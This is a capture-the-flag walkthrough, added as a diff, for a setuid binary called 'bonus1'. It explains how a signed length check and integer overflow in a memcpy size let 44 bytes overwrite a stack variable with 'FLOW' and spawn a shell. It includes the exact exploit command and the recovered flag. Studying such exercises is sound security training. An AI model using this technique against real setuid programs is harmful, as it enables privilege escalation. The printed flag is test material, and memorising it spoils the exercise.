@@ -1,0 +1,60 @@
+# Bonus1 Walkthrough
+
+Binary is setuid `bonus2`.
+
+```c
+int main(int argc, char **argv) {
+  char buf[40];
+  int n;
+
+  n = atoi(argv[1]);
+  if (n > 9)
+    return 1;
+  memcpy(buf, argv[2], n * 4);
+  if (n == 0x574f4c46)             // 0x574f4c46 == "FLOW"
+    execl("/bin/sh", "sh", NULL);
+  return 0;
+}
+```
+
+## Vulnerability
+
+To reach the shell, `n` must equal `0x574f4c46`, but the guard above requires
+`n <= 9`. We bridge the two by overwriting `n` through the `memcpy`.
+
+Two flaws combine:
+
+1. Signed comparison: `if (n > 9)` is signed, so a negative `n` passes it.
+2. Integer overflow: the copy size is `n * 4`, truncated to 32 bits. A large/negative
+   `n` can make `n * 4` wrap back to a small value.
+
+`buf` and `n` are adjacent on the stack; `n` sits 40 bytes after the start of `buf`
+(`buf` at `esp+0x14`, `n` at `esp+0x3c`). Copying 44 bytes fills `buf` (40) and
+overwrites `n` (4) with attacker data.
+
+## Exploitation
+
+We need `memcpy` to copy exactly 44 bytes, i.e. `n * 4 = 44`, while keeping `n <= 9`.
+
+```
+n * 4 ≡ 44  (mod 2^32)
+n = (44 - 2^32) / 4 = -1073741813
+```
+
+`-1073741813` is negative (passes `n <= 9`) and `(-1073741813 * 4) mod 2^32 = 44`.
+The last 4 of the 44 copied bytes overwrite `n` with `"FLOW"` = `0x574f4c46`.
+
+```sh
+./bonus1 -1073741813 $(python -c 'print "A"*40 + "FLOW"')
+```
+
+- `-1073741813`: passes `n <= 9` and forces a 44-byte copy.
+- `"A"*40`: fills `buf`.
+- `"FLOW"`: overwrites `n` with `0x574f4c46`, so the final check passes and `execl`
+  runs `/bin/sh`.
+
+Flag:
+
+```txt
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
